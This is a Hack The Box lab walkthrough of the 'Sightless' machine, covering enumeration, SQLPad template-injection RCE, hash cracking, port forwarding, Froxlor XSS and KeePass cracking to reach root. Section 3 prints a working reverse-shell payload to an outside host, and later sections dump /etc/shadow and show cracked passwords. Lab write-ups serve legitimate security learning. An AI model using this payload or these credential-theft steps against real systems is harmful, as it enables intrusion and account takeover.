# HTB - Sightless

**IP Address:** `10.10.11.32`  
**OS:** Ubuntu (Jammy + Docker)  
**Difficulty:** Medium  
**Tags:** Web, Docker, SQLPad, CVE-2022-0944, SSH, Port Forwarding, KeePass

---

## 1. Enumeration

### 1.1 Ping

```bash
ping -c 1 10.10.11.32
```

✅ Machine is reachable

### 1.2 Nmap Scans

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.32 -oG allPorts
nmap -p21,22,80 -sC -sV 10.10.11.32 -oN targeted
```

Found:

- 21/tcp → FTP
- 22/tcp → SSH (OpenSSH 8.9p1)
- 80/tcp → HTTP (nginx 1.18.0)

---

## 2. Web Analysis

After editing `/etc/hosts`, accessed subdomain running **SQLPad**.  
Verified via port check:

```bash
nmap -p3306 -sC -sV 10.10.11.32
```

Port was closed, but a connection attempt was seen on the server.

---

## 3. Exploiting SQLPad (CVE-2022-0944)

Used RCE vulnerability:

```json
{{process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.4/443 0>&1"')}}
```

Started listener:

```bash
nc -lnvp 443
```

✅ Received reverse shell  
Confirmed access inside Docker container.

---

## 4. Extracting Password Hashes

Dumped `/etc/shadow`. Found hash for `michael`:

```bash
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
```

Used `hashid` → SHA-512 (mode 1800)

Cracked with Hashcat:

```bash
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

✅ Password: `insaneclownposse`

---

## 5. SSH to Main Host

```bash
ssh michael@10.10.11.32
```

🏁 **User flag obtained**

---

## 6. Local Port Forwarding

Apache2 was running on `127.0.0.1:8080`, discovered via:

```bash
ss -nltp
```

Port forwarding:

```bash
ssh michael@10.10.11.32 -L 8081:127.0.0.1:8080
```

Added to `/etc/hosts`:

```
127.0.0.1 admin.sightless.htb
```

Accessed: `http://admin.sightless.htb:8081`

---

## 7. Froxlor Exploitation (XSS)

Identified Froxlor panel on port 8080.

Found advisory: [GHSA-x525-54hf-xr53](https://github.com/advisories/GHSA-x525-54hf-xr53)

Used Burp Suite to intercept login and inject payload into login field.

After second login attempt with:

- Username: abcd  
- Password: Abcd@@1234

✅ Logged in as admin

---

## 8. FTP Access & KeePass

New user `web1` was visible. Updated password via web panel.

Logged in via FTP:

```bash
lftp 10.10.11.32
```

Found file: `Database.kdb` (KeePass DB)

Extracted hash:

```bash
keepass2john Database.kdb > hash.txt
```

Cracked with:

```bash
hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
```

✅ Password: `bulldogs`

Opened DB in KeePassXC → found root credentials

---

## 9. SSH as Root

Password did not work directly.

Discovered attached `id_rsa` file in KeePass entry.  
Pasted contents into local file and set permissions:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.10.11.32
```

🏁 **Root flag obtained**

---

# ✅ MACHINE COMPLETE
